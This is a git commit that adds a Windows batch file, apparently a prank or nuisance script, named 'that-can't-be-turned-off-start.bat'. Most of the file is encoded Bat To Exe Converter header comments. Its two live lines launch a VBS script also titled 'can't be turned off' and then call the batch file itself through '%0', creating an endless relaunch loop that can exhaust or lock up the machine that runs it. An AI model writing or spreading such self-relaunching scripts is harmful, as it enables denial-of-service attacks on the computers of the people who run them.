e16485da3a4fb39ede0875176e81adf243fa7ef1
wayne1000901103 <140511989+wayne1000901103@users.noreply.github.com>
2025-02-10 08:31:02 +0800

    提交檔案

---
+++ that-can’t-be-turned-off-start.bat
@@ -0,0 +1,36 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWGW44k8nKQlRAQyNL3+GNb0d+u3/r8yIrkkYRvEDVZb6yqSyMPIS5E6pYZki2kZsuvhBGBNZal+obwG2SZdW+2aAetOJoQHkTgWG4E1+DWdn5w==
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpSI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdDPlDlST9VA1ZRNbXxC+D2O7FLAYqM704+6CsF4hefseaJ/nyqaPLute/krreao53ntO1cgNApm4hwbmbAp5vXtQuGGBesiatUHkUk3p
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+start VBS-that-can¡¦t-be-turned-off.vbs
+%0
